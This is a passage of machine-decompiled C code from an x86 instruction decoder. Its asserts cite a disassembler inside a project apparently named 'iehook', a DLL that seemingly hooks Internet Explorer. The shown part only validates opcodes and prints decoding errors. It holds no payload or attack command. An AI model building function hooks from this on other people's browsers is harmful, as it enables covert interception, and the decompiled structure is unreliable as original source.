            *v29 = (int32_t)L"!Instruction->OpcodeLength";
            __wassert();
            v358 = v24;
        }
        unsigned char v359 = *(char *)v302; // 0x1000c173
        *v243 = *v243 + 1;
        *v304 = v359;
        int32_t v360 = v358; // 0x1000c18e
        if (*(int32_t *)v298 != (int32_t)&g50) {
            // 0x1000c190
            *v26 = 1274;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"X86Opcode->Table == X86_Opcodes_2";
            __wassert();
            v360 = v24;
        }
        // 0x1000c1ad
        v324 = v359;
        v309 = v360;
        v325 = 56 * v324;
        v326 = v325 + (int32_t)&g50;
        char * v361 = (char *)v325; // 0x1000c1cf
        if (*(int32_t *)(v325 + (int32_t)&g51) == 0) {
            // 0x1000c1d7
            if (*(int32_t *)v326 == 0) {
                if (v6 != 0) {
                    // 0x1000fddb
                    return 0;
                }
                // 0x1000c1e6
                *v26 = v324;
                uint32_t v362 = *v8; // 0x1000c1e7
                uint32_t v363 = *v25 + v362; // 0x1000c1ee
                *v28 = 15;
                *v29 = *v27 + v362 / 0x80000000 + (int32_t)(v363 < v362);
                *v30 = v363;
                *(int32_t *)(v257 - 20) = (int32_t)"[0x%08I64X] ERROR: Invalid two byte opcode 0x%02X 0x%02X\n";
                _printf(v361);
                // 0x1000fdca
                *v26 = ___iob_func() + 32;
                _fflush((struct _IO_FILE *)&g173);
                // 0x1000fddb
                return 0;
            }
        }
        char v364 = *(char *)(v309 + 96); // 0x1000c210
        if ((v364 & -16) == -128) {
            // 0x1000c21d
            if (*(char *)(v324 + (int32_t)&g67) != 0) {
                if (v6 != 0) {
                    // 0x1000fddb
                    return 0;
                }
                uint32_t v365 = *v8; // 0x1000c233
                *v26 = v325 + (int32_t)&g50 + 12;
                *v28 = v324;
                uint32_t v366 = *v25 + v365; // 0x1000c241
                *v29 = 15;
                *v30 = *v27 + v365 / 0x80000000 + (int32_t)(v366 < v365);
                *(int32_t *)(v257 - 20) = v366;
                *(int32_t *)(v257 - 24) = (int32_t)"[0x%08I64X] ERROR: Opcode 0x%02X 0x%02X (\"%s\") illegal in 64-bit mode\n";
                _printf(v361);
                // 0x1000fdca
                *v26 = ___iob_func() + 32;
                _fflush((struct _IO_FILE *)&g173);
                // 0x1000fddb
                return 0;
            }
        }
        if ((v364 & 15) == 2) {
            // 0x1000c269
            if (*(char *)(v324 + (int32_t)&g65) != 0) {
                if (v6 != 0) {
                    // 0x1000fddb
                    return 0;
                }
                uint32_t v367 = *v8; // 0x1000c281
                uint32_t v368 = *v25 + v367; // 0x1000c28b
                *v26 = v325 + (int32_t)&g50 + 12;
                *v28 = v324;
                *v29 = 15;
                *v30 = *v27 + v367 / 0x80000000 + (int32_t)(v368 < v367);
                *(int32_t *)(v257 - 20) = v368;
                *(int32_t *)(v257 - 24) = (int32_t)"[0x%08I64X] ERROR: Opcode 0x%02X 0x%02X (\"%s\") illegal with 16-bit operand size\n";
                _printf(v361);
                // 0x1000fdca
                *v26 = ___iob_func() + 32;
                _fflush((struct _IO_FILE *)&g173);
                // 0x1000fddb
                return 0;
            }
        }
        // 0x1000c2af
        v327 = v302 + 1;
        v328 = (char *)(v324 + (int32_t)&g59);
        v329 = (char *)(v309 + 94);
        char v369 = 8 * *v328 & 8;
        *v329 = v369 | *v329 & -9;
        if (v369 != 0) {
            // 0x1000c2cd
            *(char *)(v309 + 61) = *(char *)v327;
        }
        // 0x1000c2d5
        v330 = (char *)v326;
        v331 = (char *)(a1 + 321);
        *v331 = 15;
        v332 = (char *)(a1 + 322);
        *v332 = v359;
        *v334 = 2;
        v333 = *(int32_t *)(v325 + (int32_t)&g50 + 8);
        v308 = v333;
        v321 = 0;
        v312 = v327;
        v316 = v330;
        v318 = v324;
        v310 = v309;
        v311 = v326;
        if ((v333 & -0x48000000) != 0) {
            goto lab_0x1000c968;
        } else {
            if (v51 == 0) {
                goto lab_0x1000c5f1;
            } else {
                // 0x1000c309
                if (*(int32_t *)(v325 + (int32_t)&g55) != 0) {
                    goto lab_0x1000c31f;
                } else {
                    // 0x1000c312
                    if (*(int32_t *)(v325 + (int32_t)&g54) == 0) {
                        goto lab_0x1000c5f1;
                    } else {
                        goto lab_0x1000c31f;
                    }
                }
            }
        }
    }
  lab_0x1000c968:;
    int32_t v370 = v311;
    int32_t v371 = v310;
    int32_t v372 = v318;
    int32_t v373 = v312;
    char v374 = v321;
    int32_t v375 = v308; // 0x1000c968
    int32_t v376; // 0x1000b7b0
    int32_t v377; // 0x1000b7b0
    char * v378; // 0x1000b7b0
    char * v379; // 0x1000b7b0
    char v380; // 0x1000b7b0
    int32_t * v381; // 0x1000b7b0
    int32_t * v382; // 0x1000ccba
    if ((v375 & 0x10000000) == 0) {
        if (v375 >= 0) {
            // 0x1000cc36
            v378 = v316;
            if ((v375 & 0x20000000) == 0) {
                // 0x1000ce10
                v323 = v374;
                v314 = v373;
                v315 = v378;
                v320 = v372;
                if ((v375 & 0x8000000) == 0) {
                    goto lab_0x1000ce72;
                } else {
                    int32_t * v383 = (int32_t *)v370; // 0x1000ce17
                    int32_t v384 = *v383; // 0x1000ce17
                    int32_t v385 = v384; // 0x1000ce1a
                    if (v384 == 0) {
                        // 0x1000ce1c
                        *v26 = 1607;
                        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *v29 = (int32_t)L"X86Opcode->Table";
                        __wassert();
                        v385 = *v383;
                    }
                    int32_t v386 = v385;
                    int32_t v387 = *(int32_t *)(*v1 + 4) != 3 ? v386 : v386 + 56;
                    char * v388 = (char *)v387;
                    v323 = v374;
                    v314 = v373;
                    v315 = v388;
                    v320 = v372;
                    if (*(int32_t *)(v387 + 8) != 0) {
                        goto lab_0x1000ce72;
                    } else {
                        // 0x1000ce54
                        v323 = v374;
                        v314 = v373;
                        v315 = v388;
                        v320 = v372;
                        if (*(int32_t *)v387 != 0) {
                            goto lab_0x1000ce72;
                        } else {
                            // 0x1000ce5b
                            *v26 = 1610;
                            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *v29 = (int32_t)L"!X86_INVALID(X86Opcode)";
                            v322 = v374;
                            v313 = v373;
                            v317 = v388;
                            v319 = v372;
                            goto lab_0x1000ce6a;
                        }
                    }
                }
            } else {
                char * v389 = (char *)(v371 + 93);
                char v390 = *v389; // 0x1000cc41
                int32_t v391 = v371; // 0x1000cc45
                if ((v390 & 2) != 0) {
                    char v392 = *v14; // 0x1000cc47
                    char v393 = v390; // 0x1000cc4e
                    char * v394 = v389; // 0x1000cc4e
                    int32_t v395 = v371; // 0x1000cc4e
                    if ((v392 & 16) == 0) {
                        // 0x1000cc50
                        v393 = v390;
                        v394 = v389;
                        v395 = v371;
                        if (*(int32_t *)v370 == (int32_t)&g49) {
                            char * v396 = v389; // 0x1000cc5c
                            char v397 = v392; // 0x1000cc5c
                            int32_t v398 = v371; // 0x1000cc5c
                            if (v6 == 0) {
                                uint32_t v399 = *v8; // 0x1000cc5e
                                uint32_t v400 = *v25 + v399; // 0x1000cc65
                                *v26 = *v27 + v399 / 0x80000000 + (int32_t)(v400 < v399);
                                *v28 = v400;
                                *v29 = (int32_t)"[0x%08I64X] ANOMALY: operand size prefix used with 3DNOW instruction\n";
                                _printf((char *)&g173);
                                v396 = (char *)(a1 + 773);
                                v397 = *v14;
                                v398 = v24;
                            }
                            // 0x1000cc83
                            *v14 = v397 | 16;
                            v393 = *v396;
                            v394 = v396;
                            v395 = v398;
                        }
                    }
                    // 0x1000cc8a
                    v391 = v395;
                    char * v401 = (char *)(v391 + 96); // 0x1000cc8a
                    *v394 = v393 & -3;
                    *v401 = *v401 & -16 | 4;
                }
                int32_t v402 = v391;
                int32_t v403 = 0; // 0x1000cc9c
                if (*(int32_t *)(v370 + 28) != 0) {
                    // 0x1000cc9e
                    v403 = 1;
                    if (*(int32_t *)(v370 + 32) != 0) {
                        // 0x1000cca4
                        v403 = *(int32_t *)(v370 + 36) != 0 ? 3 : 2;
                    }
                }
                int32_t v404 = v403;
                v382 = (int32_t *)(a1 + 324);
                *(int32_t *)(a1 + 672) = v404;
                if (*v382 != 2) {
                    goto lab_0x1000ccd4;
                } else {
                    // 0x1000ccc9
                    if (v404 == 2 == ((*(char *)(v402 + 94) & 8) != 0)) {
                        goto lab_0x1000cceb;
                    } else {
                        goto lab_0x1000ccd4;
                    }
                }
            }
        } else {
            int32_t * v405 = (int32_t *)v370; // 0x1000cb54
            int32_t v406 = v371; // 0x1000cb57
            if (*v405 == 0) {
                // 0x1000cb59
                *v26 = 1550;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"X86Opcode->Table";
                __wassert();
                v406 = v24;
            }
            unsigned char v407 = *(char *)(v406 + 61); // 0x1000cb73
            uint32_t v408 = (int32_t)v407; // 0x1000cb73
            int32_t v409; // 0x1000b7b0
            char v410; // 0x1000b7b0
            int32_t v411; // 0x1000b7b0
            if (v407 >= 192) {
                int32_t v412 = v408 & 63; // 0x1000cba0
                v410 = v407 & 63;
                v409 = v412;
                v411 = 56 * v412 + 448 + *v405;
            } else {
                int32_t v413 = v408 / 8 & 7; // 0x1000cb82
                v410 = v413;
                v409 = v413;
                v411 = *v405 + 56 * v413;
            }
            int32_t v414 = v411;
            char v415 = v410;
            if (*(int32_t *)(v414 + 8) == 0) {
                // 0x1000cbbd
                if (*(int32_t *)v414 == 0) {
                    if (v6 != 0) {
                        // 0x1000fddb
                        return 0;
                    }
                    // 0x1000cbcc
                    *v26 = v409 + 8;
                    *v28 = v408;
                    *v29 = v372;
                    uint32_t v416 = *v8; // 0x1000cbd8
                    uint32_t v417 = *v25 + v416; // 0x1000cbdf
                    *v30 = *v27 + v416 / 0x80000000 + (int32_t)(v417 < v416);
                    *(int32_t *)(v257 - 20) = v417;
                    *(int32_t *)(v257 - 24) = (int32_t)"[0x%08I64X] ERROR: Invalid FPU opcode 0x%02X + modrm extension 0x%02X (index 0x%02X)\n";
                    _printf((char *)(int32_t)v415);
                    // 0x1000fdca
                    *v26 = ___iob_func() + 32;
                    _fflush((struct _IO_FILE *)&g173);
                    // 0x1000fddb
                    return 0;
                }
            }
            char * v418 = (char *)v414;
            v380 = v415;
            v379 = v418;
            v323 = v415;
            v314 = v373;
            v315 = v418;
            v320 = v372;
            if (*(int32_t *)(v414 + 28) == 0) {
                goto lab_0x1000cc23;
            } else {
                goto lab_0x1000ce72;
            }
        }
    } else {
        int32_t * v419 = (int32_t *)v370; // 0x1000c976
        int32_t v420 = v371; // 0x1000c979
        if (*v419 == 0) {
            // 0x1000c97b
            *v26 = 1513;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"X86Opcode->Table";
            __wassert();
            v420 = v24;
        }
        int32_t v421 = v420; // 0x1000c99c
        if (*(int32_t *)(a1 + 324) != 2) {
            // 0x1000c99e
            *v26 = 1514;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"Instruction->OpcodeLength == 2";
            __wassert();
            v421 = v24;
        }
        int32_t v422 = v421; // 0x1000c9bc
        if ((*(char *)(v421 + 94) & 8) == 0) {
            // 0x1000c9be
            *v26 = 1515;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"X86Instruction->HasModRM";
            __wassert();
            v422 = v24;
        }
        int32_t v423 = (int32_t)*(char *)v373; // 0x1000c9db
        int32_t v424 = 56 * v423 + *v419; // 0x1000c9e9
        int32_t v425 = *(int32_t *)(v424 + 8); // 0x1000c9ec
        char * v426 = (char *)v424; // 0x1000c9ef
        v381 = (int32_t *)v424;
        int32_t v427 = *v381;
        if (v425 != 0) {
            if (v427 == 0) {
                // 0x1000cb2b
                v323 = v374;
                v314 = v373;
                v315 = v426;
                v320 = v372;
                if (*(int32_t *)(v424 + 28) == 0) {
                    goto lab_0x1000cc23;
                } else {
                    goto lab_0x1000ce72;
                }
            } else {
                // 0x1000ca48
                *v26 = 1524;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"!X86Opcode->MnemonicFlags";
                __wassert();
                v376 = *v381;
                v377 = v24;
                goto lab_0x1000ca62;
            }
        } else {
            // 0x1000c9f6
            v376 = v427;
            v377 = v422;
            if (v427 == v425) {
                if (v425 != v6) {
                    // 0x1000fddb
                    return 0;
                }
                // 0x1000ca03
                *v26 = v423;
                *v28 = (int32_t)*(char *)(a1 + 322);
                *v29 = (int32_t)*(char *)(a1 + 321);
                uint32_t v428 = *v8; // 0x1000ca14
                uint32_t v429 = *v25 + v428; // 0x1000ca1b
                *v30 = *v27 + v428 / 0x80000000 + (int32_t)(v429 < v428);
                *(int32_t *)(v257 - 20) = v429;
                *(int32_t *)(v257 - 24) = (int32_t)"[0x%08I64X] ERROR: Illegal opcode 0x%02X 0x%02X + modrm 0x%02X\n";
                _printf(v426);
                // 0x1000fdca
                *v26 = ___iob_func() + 32;
                _fflush((struct _IO_FILE *)&g173);
                // 0x1000fddb
                return 0;
            }
            goto lab_0x1000ca62;
        }
    }
  lab_0x1000ce72:;
    int32_t v430 = v320;
    char * v431 = v315;
    int32_t v432 = v314;
    char v433 = v323;
    int32_t v434 = *(int32_t *)(*v1 + 4); // 0x1000ce75
    int32_t v435 = (int32_t)v431; // 0x1000ce78
    if (v434 == 2) {
        // 0x1000ce80
        if (*(int32_t *)(v435 + 4) > v434) {
            if (v6 != 0) {
                // 0x1000fddb
                return 0;
            }
            uint32_t v436 = *v8; // 0x1000ce96
            *v26 = (int32_t)*v304;
            uint32_t v437 = *v25 + v436; // 0x1000cea1
            *v28 = v435 + 12;
            *v29 = *v27 + v436 / 0x80000000 + (int32_t)(v437 < v436);
            *v30 = v437;
            *(int32_t *)(v257 - 20) = (int32_t)"[0x%08I64X] ERROR: Instruction \"%s\" (opcode 0x%02X) can't be used in 16-bit X86\n";
            _printf((char *)&g173);
            // 0x1000fdca
            *v26 = ___iob_func() + 32;
            _fflush((struct _IO_FILE *)&g173);
            // 0x1000fddb
            return 0;
        }
    }
    if (v434 != 3) {
        // 0x1000cec7
        if (*(int32_t *)(v435 + 4) >= 12) {
            if (v6 != 0) {
                // 0x1000fddb
                return 0;
            }
            // 0x1000ced7
            *v26 = (int32_t)*v304;
            uint32_t v438 = *v8; // 0x1000cedf
            uint32_t v439 = *v25 + v438; // 0x1000cee9
            *v28 = v435 + 12;
            *v29 = *v27 + v438 / 0x80000000 + (int32_t)(v439 < v438);
            *v30 = v439;
            *(int32_t *)(v257 - 20) = (int32_t)"[0x%08I64X] ERROR: Instruction \"%s\" (opcode 0x%02X) can only be used in X86-64\n";
            _printf((char *)&g173);
            // 0x1000fdca
            *v26 = ___iob_func() + 32;
            _fflush((struct _IO_FILE *)&g173);
            // 0x1000fddb
            return 0;
        }
    }
    int32_t * v440 = (int32_t *)(a1 + 324); // 0x1000cf0a
    int32_t * v441 = (int32_t *)(v435 + 8);
    if (*v440 == 0) {
        goto lab_0x1000cf1e;
    } else {
        // 0x1000cf13
        if (*v441 != 0) {
            goto lab_0x1000cf35;
        } else {
            // 0x1000cf19
            if (*(int32_t *)v431 != 0) {
                goto lab_0x1000cf35;
            } else {
                goto lab_0x1000cf1e;
            }
        }
    }
  lab_0x1000c5f1:;
    int32_t * v442 = (int32_t *)v326;
    int32_t v443 = *v442; // 0x1000c5f4
    int32_t v444; // 0x1000b7b0
    int32_t v445; // 0x1000b7b0
    char * v446; // 0x1000b7b0
    int32_t v447; // 0x1000b7b0
    char v448; // 0x1000c621
    int32_t v449; // 0x1000c656
    int32_t v450; // 0x1000c659
    char * v451; // 0x1000c65c
    if (v443 == 0) {
        char * v452 = v329; // 0x1000c721
        int32_t v453 = v309; // 0x1000c721
        if (v326 == -12) {
            // 0x1000c723
            *v26 = 1427;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"X86Opcode->Mnemonic";
            __wassert();
            v452 = (char *)(a1 + 774);
            v453 = v24;
        }
        char * v454 = v452;
        char v455 = 8 * *v328 & 8;
        *v454 = v455 | *v454 & -9;
        v323 = 0;
        v314 = v327;
        v315 = v330;
        v320 = v324;
        if (v455 != 0) {
            // 0x1000c75f
            *(char *)(v453 + 61) = *(char *)v327;
            v323 = 0;
            v314 = v327;
            v315 = v330;
            v320 = v324;
        }
        goto lab_0x1000ce72;
    } else {
        int32_t v456 = v443; // 0x1000c5ff
        int32_t v457 = v309; // 0x1000c5ff
        if (v333 != 0) {
            // 0x1000c601
            *v26 = 1406;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"!X86Opcode->MnemonicFlags";
            __wassert();
            v456 = *v442;
            v457 = v24;
        }
        int32_t v458 = v456; // 0x1000c629
        int32_t v459 = v457; // 0x1000c629
        if (v456 == 0) {
            // 0x1000c62b
            *v26 = 1409;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"X86Opcode->Table";
            __wassert();
            v458 = *v442;
            v459 = v24;
        }
        // 0x1000c648
        v448 = *(char *)(v457 + 61) / 8 & 7;
        int32_t v460 = v448; // 0x1000c621
        v445 = v459;
        v449 = v458 + 56 * v460;
        v450 = *(int32_t *)(v449 + 8);
        v451 = (char *)v449;
        if (v450 != 0) {
            goto lab_0x1000c6a5;
        } else {
            // 0x1000c663
            v446 = v451;
            v447 = v324;
            v444 = v460;
            if (*(int32_t *)v449 != v450) {
                goto lab_0x1000c6a5;
            } else {
                goto lab_0x1000c667;
            }
        }
    }
  lab_0x1000cf1e:
    // 0x1000cf1e
    *v26 = 1627;
    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *v29 = (int32_t)L"Instruction->OpcodeLength && !X86_INVALID(X86Opcode)";
    __wassert();
    goto lab_0x1000cf35;
  lab_0x1000c31f:;
    char * v502 = (char *)(a1 + 323); // 0x1000c31f
    *v502 = v51;
    int32_t v1133 = *v31; // 0x1000c325
    *v334 = 3;
    int32_t v1134 = 0; // 0x1000c339
    if (v1133 != 0) {
        int32_t v1135 = 0;
        v1134 = v1135;
        while (*(char *)(v1135 + v32) == 0) {
            int32_t v1136 = v1135 + 1; // 0x1000c34a
            int32_t v1137 = v1136; // 0x1000c351
            v1134 = v1136;
            if (v1136 >= *v31) {
                // break -> 0x1000c353
                break;
            }
            v1135 = v1137;
            v1134 = v1135;
        }
    }
    // 0x1000c353
    if (v1134 == v1133) {
        // 0x1000c357
        *v26 = 1337;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"i != Instruction->PrefixCount";
        __wassert();
    }
    // 0x1000c36e
    *v31 = *v31 - 1;
    int32_t v1138 = v1134 + v32; // 0x1000c374
    *(char *)v1138 = 0;
    *v26 = *v31 - v1134;
    *v28 = a1 + 301 + v1134;
    *v29 = v1138;
    _memcpy(&g173, &g173, (int32_t)&g173);
    *(char *)(*v31 + v32) = 0;
    *v14 = *v14 & -5;
    char * v549 = (char *)(a1 + 773); // 0x1000c3ad
    *v549 = *v549 & -99;
    if (v51 != 102) {
        goto lab_0x1000c3e1;
    } else {
        // 0x1000c3ba
        if (*(int32_t *)(*v1 + 4) != 3) {
            // 0x1000c3d7
            *v45 = *v45 & -16 | 4;
            goto lab_0x1000c3e1;
        } else {
            // 0x1000c3c3
            if ((*(char *)(a1 + 745) & 16) == 0) {
                // 0x1000c3d7
                *v45 = *v45 & -16 | 4;
                goto lab_0x1000c3e1;
            } else {
                // 0x1000c3c9
                *v45 = *v45 & -16 | 8;
                goto lab_0x1000c3e1;
            }
        }
    }
  lab_0x1000cf35:
    // 0x1000cf35
    __asm_rep_movsd_memcpy((char *)(a1 + 684), v431, 14);
    int32_t * v132 = (int32_t *)(a1 + 280); // 0x1000cf50
    int32_t v461 = *v132 | *v441 & 0x7fffff00; // 0x1000cf50
    *v132 = v461;
    if (v461 == 0) {
        // 0x1000cf58
        *v26 = 1630;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"Instruction->Groups";
        __wassert();
    }
    int32_t * v130 = (int32_t *)(a1 + 284); // 0x1000cf7e
    uint32_t v462 = *v130 | *v441 & 0x7fffffff; // 0x1000cf7e
    *v130 = v462;
    if (v462 < *v132) {
        // 0x1000cf92
        *v26 = 1632;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"(U32)Instruction->Type >= Instruction->Groups";
        __wassert();
    }
    int32_t * v463 = (int32_t *)(v435 + 28);
    int32_t v464 = 0; // 0x1000cfb3
    if (*v463 != 0) {
        // 0x1000cfb5
        v464 = 1;
        if (*(int32_t *)(v435 + 32) != 0) {
            // 0x1000cfbb
            v464 = *(int32_t *)(v435 + 36) != 0 ? 3 : 2;
        }
    }
    // 0x1000cfd3
    v140 = (int32_t *)(a1 + 672);
    *v140 = v464;
    int32_t v465 = *v130; // 0x1000cfd9
    if (v465 > 0x40001) {
        switch (v465) {
            case 0x40005: {
                goto lab_0x1000d058;
            }
            case 0x40003: {
                goto lab_0x1000d058;
            }
            default: {
                if (v465 != 0x40008) {
                    goto lab_0x1000d0a4;
                } else {
                    goto lab_0x1000d058;
                }
            }
        }
    } else {
        switch (v465) {
            case 0x40001: {
                goto lab_0x1000d058;
            }
            case 261: {
                goto lab_0x1000d058;
            }
            default: {
                if (v465 < 2057) {
                    char v466 = *v14; // 0x1000cffd
                    if ((v466 & 16) == 0) {
                        // 0x1000d006
                        if ((*(char *)(a1 + 773) & 8) != 0) {
                            char v467 = v466; // 0x1000d010
                            if (v6 == 0) {
                                uint32_t v468 = *v8; // 0x1000d012
                                uint32_t v469 = *v25 + v468; // 0x1000d019
                                *v26 = *v27 + v468 / 0x80000000 + (int32_t)(v469 < v468);
                                *v28 = v469;
                                *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                                _printf((char *)&g173);
                                v467 = *v14;
                            }
                            // 0x1000d037
                            *v14 = v467 | 16;
                        }
                    }
                    // 0x1000d03e
                    *(int32_t *)(a1 + 752) = 2;
                    goto lab_0x1000d0a0;
                } else {
                    goto lab_0x1000d0a4;
                }
            }
        }
    }
  lab_0x1000ce6a:
    // 0x1000ce6a
    __wassert();
    v323 = v322;
    v314 = v313;
    v315 = v317;
    v320 = v319;
    goto lab_0x1000ce72;
  lab_0x1000cc23:
    // 0x1000cc23
    *v243 = *v243 + 1;
    v323 = v380;
    v314 = v373 + 1;
    v315 = v379;
    v320 = v372;
    goto lab_0x1000ce72;
  lab_0x1000ca62:;
    int32_t v470 = v376; // 0x1000ca70
    int32_t v471 = v377; // 0x1000ca70
    if (v376 == 0) {
        // 0x1000ca72
        *v26 = 1527;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"X86Opcode->Table";
        __wassert();
        v470 = *v381;
        v471 = v24;
    }
    char v472 = *(char *)(v377 + 61) / 8 & 7; // 0x1000ca68
    int32_t v473 = v470 + 56 * (int32_t)v472; // 0x1000ca9d
    int32_t v474 = *(int32_t *)(v473 + 8); // 0x1000caa0
    char * v475 = (char *)v473; // 0x1000caa3
    if (v474 != 0) {
        goto lab_0x1000cab2;
    } else {
        // 0x1000caaa
        if (*(int32_t *)v473 == v474) {
            goto lab_0x1000c667;
        } else {
            goto lab_0x1000cab2;
        }
    }
  lab_0x1000c6a5:;
    int32_t v476 = v445; // 0x1000c6ab
    if ((v450 & -0x48000000) != 0) {
        // 0x1000c6ad
        *v26 = 1418;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"!X86_SPECIAL_EXTENSION(X86Opcode)";
        __wassert();
        v476 = v24;
    }
    char v477 = *(char *)(v324 + (int32_t)&g64); // 0x1000c6ca
    char * v478 = (char *)(v476 + 97); // 0x1000c6d6
    *v478 = 4 * v477 & 124 | *v478 & -125;
    if (v477 >= 20) {
        // 0x1000c6ea
        *v26 = 1421;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"Group > 0 && Group <= 19";
        __wassert();
    }
    // 0x1000c701
    v323 = v448;
    v314 = v327;
    v315 = v451;
    v320 = v324;
    if (v449 != -12) {
        goto lab_0x1000ce72;
    } else {
        // 0x1000c70a
        *v26 = 1422;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"X86Opcode->Mnemonic";
        v322 = v448;
        v313 = v327;
        v317 = v451;
        v319 = v324;
        goto lab_0x1000ce6a;
    }
  lab_0x1000c3e1:
    // 0x1000c3e1
    if (*(int32_t *)(*v1 + 4) == 2) {
        if (v6 != 0) {
            // 0x1000fddb
            return 0;
        }
        uint32_t v479 = *v8; // 0x1000c3f4
        uint32_t v480 = *v25 + v479; // 0x1000c3fb
        *v26 = *v27 + v479 / 0x80000000 + (int32_t)(v480 < v479);
        *v28 = v480;
        *v29 = (int32_t)"[0x%08I64X] ERROR: SSE invalid in 16-bit mode\n";
        _printf((char *)&g173);
        // 0x1000fdca
        *v26 = ___iob_func() + 32;
        _fflush((struct _IO_FILE *)&g173);
        // 0x1000fddb
        return 0;
    }
    // 0x1000c41b
    if ((*(char *)(a1 + 774) & 8) == 0) {
        // 0x1000c421
        *v26 = 1360;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"X86Instruction->HasModRM";
        __wassert();
    }
    int32_t v481; // 0x1000b7b0
    char * v482; // 0x1000b7b0
    char * v483; // 0x1000b7b0
    switch (v51) {
        case 102: {
            // 0x1000c467
            v482 = (char *)(v325 + (int32_t)&g54);
            goto lab_0x1000c473;
        }
        case -14: {
            // 0x1000c459
            v482 = (char *)(v325 + (int32_t)&g56);
            goto lab_0x1000c473;
        }
        default: {
            // 0x1000c448
            v482 = v330;
            if (v51 != -13) {
                goto lab_0x1000c473;
            } else {
                int32_t v484 = v325 + (int32_t)&g57; // 0x1000c44e
                v483 = (char *)v484;
                v481 = v484;
                goto lab_0x1000c476;
            }
        }
    }
  lab_0x1000ccd4:
    // 0x1000ccd4
    *v26 = 1586;
    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *v29 = (int32_t)L"Instruction->OpcodeLength == 2 && X86Instruction->HasModRM && Instruction->OperandCount == 2";
    __wassert();
    goto lab_0x1000cceb;
  lab_0x1000cab2:;
    int32_t v1124 = v471; // 0x1000cab8
    if ((v474 & -0x48000000) != 0) {
        // 0x1000caba
        *v26 = 1536;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"!X86_SPECIAL_EXTENSION(X86Opcode)";
        __wassert();
        v1124 = v24;
    }
    char v1125 = *(char *)(v372 + (int32_t)&g64); // 0x1000cad7
    char * v1126 = (char *)(v1124 + 97); // 0x1000cae3
    *v1126 = 4 * v1125 & 124 | *v1126 & -125;
    if (v1125 >= 20) {
        // 0x1000caf7
        *v26 = 1539;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"Group > 0 && Group <= 19";
        __wassert();
    }
    // 0x1000cb0e
    v323 = v472;
    v314 = v373;
    v315 = v475;
    v320 = v372;
    if (v473 != -12) {
        goto lab_0x1000ce72;
    } else {
        // 0x1000cb17
        *v26 = 1540;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"X86Opcode->Mnemonic";
        v322 = v472;
        v313 = v373;
        v317 = v475;
        v319 = v372;
        goto lab_0x1000ce6a;
    }
  lab_0x1000c667:
    // 0x1000c667
    *v243 = *v243 + 1;
    if (v6 != 0) {
        // 0x1000fddb
        return 0;
    }
    // 0x1000c677
    *v26 = v444;
    uint32_t v1127 = *v8; // 0x1000c67b
    *v28 = v447;
    uint32_t v1128 = *v25 + v1127; // 0x1000c683
    *v29 = 15;
    *v30 = *v27 + v1127 / 0x80000000 + (int32_t)(v1128 < v1127);
    *(int32_t *)(v257 - 20) = v1128;
    *(int32_t *)(v257 - 24) = (int32_t)"[0x%08I64X] ERROR: Invalid group opcode 0x%02X 0x%02X extension 0x%02X\n";
    _printf(v446);
    // 0x1000fdca
    *v26 = ___iob_func() + 32;
    _fflush((struct _IO_FILE *)&g173);
    // 0x1000fddb
    return 0;
  lab_0x1000d058:;
    char v1129 = *v14; // 0x1000d058
    if ((v1129 & 16) == 0) {
        // 0x1000d061
        if ((*(char *)(a1 + 773) & 8) != 0) {
            char v1130 = v1129; // 0x1000d06b
            if (v6 == 0) {
                uint32_t v1131 = *v8; // 0x1000d06d
                uint32_t v1132 = *v25 + v1131; // 0x1000d074
                *v26 = *v27 + v1131 / 0x80000000 + (int32_t)(v1132 < v1131);
                *v28 = v1132;
                *v29 = (int32_t)"[0x%08I64X] ANOMALY: Unexpected segment override\n";
                _printf((char *)&g173);
                v1130 = *v14;
            }
            // 0x1000d092
            *v14 = v1130 | 16;
        }
    }
    // 0x1000d099
    *(int32_t *)(a1 + 752) = 1;
    goto lab_0x1000d0a0;
  lab_0x1000cceb:;
    int32_t v485 = (int32_t)v378; // 0x1000cceb
